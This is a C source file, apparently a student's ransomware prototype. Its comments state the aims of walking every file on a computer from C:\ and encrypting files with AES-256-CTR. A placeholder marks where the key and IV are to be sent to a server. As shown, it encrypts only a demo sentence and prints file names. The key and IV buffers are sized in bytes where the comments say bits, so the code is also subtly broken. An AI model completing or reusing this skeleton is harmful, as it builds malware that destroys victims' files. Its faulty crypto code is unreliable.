#include <dirent.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
//#include <openssl/evp.h>
#include <openssl/err.h>
#include <openssl/ssl.h>
#include <openssl/rand.h>
#include <openssl/aes.h>
#include <openssl/modes.h>
#include <openssl/rand.h>
#include <openssl/rsa.h>

// 1. Parcourir tous les fichiers d'un ordinateur
// 2. Chiffrer un fichier en AES-256-ctr

#define AES_256_KEY_SIZE 256

void handleError()
{
    unsigned long errCode;

    while (errCode = ERR_get_error())
    {
        char *err = ERR_error_string(errCode, NULL);
        printf("%s\n", err);
    }
    abort();
}

struct ctr_state
{
    unsigned char ivec[AES_BLOCK_SIZE];
    unsigned int num;
    unsigned char ecount[AES_BLOCK_SIZE];
};


int encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key,
            unsigned char *iv, unsigned char *ciphertext)
{
    EVP_CIPHER_CTX *ctx;
    int len;
    int ciphertext_len;

    /* Create and initialise the context */
    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleError();

    /*
     * Initialise the encryption operation. IMPORTANT - ensure you use a key
     * and IV size appropriate for your cipher
     * In this example we are using 256 bit AES (i.e. a 256 bit key). The
     * IV size for *most* modes is the same as the block size. For AES this
     * is 128 bits
     */
    if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_ctr(), NULL, key, iv))
        handleError();

     // Provide the message to be encrypted, and obtain the encrypted output.
     //EVP_EncryptUpdate can be called multiple times if necessary
    if(1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len))
        handleError();
    ciphertext_len = len;

    // Finalise the encryption. Further ciphertext bytes may be written at
    if(1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len))
        handleError();
    ciphertext_len += len;

    /* Clean up */
    EVP_CIPHER_CTX_free(ctx);

    return ciphertext_len;
}

int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key,
            unsigned char *iv, unsigned char *plaintext)
{
    EVP_CIPHER_CTX *ctx;
    int len;
    int plaintext_len;

    /* Create and initialise the context */
    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleError();

    /*
     * Initialise the decryption operation. IMPORTANT - ensure you use a key
     * and IV size appropriate for your cipher
     * In this example we are using 256 bit AES (i.e. a 256 bit key). The
     * IV size for *most* modes is the same as the block size. For AES this
     * is 128 bits
     */
    if(1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_ctr(), NULL, key, iv))
        handleError();

    // Provide the message to be decrypted, and obtain the plaintext output.
    // EVP_DecryptUpdate can be called multiple times if necessary.
    if(1 != EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len))
        handleError();
    plaintext_len = len;

    // Finalise the decryption. Further plaintext bytes may be written at
    if(1 != EVP_DecryptFinal_ex(ctx, plaintext + len, &len))
        handleError();
    plaintext_len += len;

    /* Clean up */
    EVP_CIPHER_CTX_free(ctx);
    return plaintext_len;
}

void action(const char *path)
{
    unsigned char key[256];             /* A 256 bit key */
    unsigned char iv[128];              /* A 128 bit IV */
    FILE *fd;

    /* Message to be encrypted */
    unsigned char *plaintext = (unsigned char *)"The quick brown fox jumps over the lazy dog";

    if (!RAND_bytes(key, sizeof(key))) {    // Key random generation
        handleError();
    }
    if (!RAND_bytes(iv, sizeof(iv))) {      //  IV random generation
        handleError();
    }

    // Send key and IV to server




    /*
     * Buffer for ciphertext. Ensure the buffer is long enough for the
     * ciphertext which may be longer than the plaintext, depending on the
     * algorithm and mode.
     */
    unsigned char ciphertext[128];
    unsigned char decryptedtext[128];           /* Buffer for the decrypted text */
    int decryptedtext_len, ciphertext_len;

    /* Encrypt the plaintext */
    ciphertext_len = encrypt (plaintext, strlen((char *)plaintext), key, iv, ciphertext);

    /* Do something useful with the ciphertext here */
    printf("Ciphertext is:\n");
    BIO_dump_fp (stdout, (const char *)ciphertext, ciphertext_len);

    /* Decrypt the ciphertext */
    decryptedtext_len = decrypt(ciphertext, ciphertext_len, key, iv,
                                decryptedtext);

    /* Add a NULL terminator. We are expecting printable text */
    decryptedtext[decryptedtext_len] = '\0';

    /* Show the decrypted text */
    printf("Decrypted text is:\n");
    printf("%s\n", decryptedtext);

}

void fct()
{
  ;
}

int in_whitelist(char *str)
{
  char *whitelist[] = {"..", ".", 0};

  for (int i = 0; whitelist[i] ; i++)
    if (strcmp(whitelist[i], str) == 0)
      return 1;
  return 0;
}

char *build_path(const char *path1, const char *path2)
{
  char *str;

  if (!(str = malloc(strlen(path1) + strlen(path2) + 2)))
    return NULL;
  *str = '\0';
  str = strcat(str, path1);
  str = strcat(str, "\\");
  str = strcat(str, path2);
  return str;
}

void apply_for_all(const char *path)
{
  DIR *d;
  struct dirent *dir;
  struct stat s;
  char *str = NULL;

  if (path && (d = opendir(path)))
  {
    while ((dir = readdir(d)) != NULL)
    {
      if (in_whitelist(dir->d_name))
        continue; // ignore
      str = build_path(path, dir->d_name);
      if ((stat(str, &s) == 0) && (s.st_mode & S_IFDIR))
        apply_for_all(str);
      free(str);
      str = NULL;
      printf("%s\n", dir->d_name);
    }
    closedir(d);
  }
}

int main()
{
  char *path = strdup("C:\\");
  // if not crypted yet
  //apply_for_all(path);
  action(path);
  free(path);
  system("PAUSE");

  // if you want to decrypt it
  //apply_for_all("/home/kali/Documents/esgi/5A/2eSemestre/projet_annuel"/*, decrypt_it*/);

  return 0;
}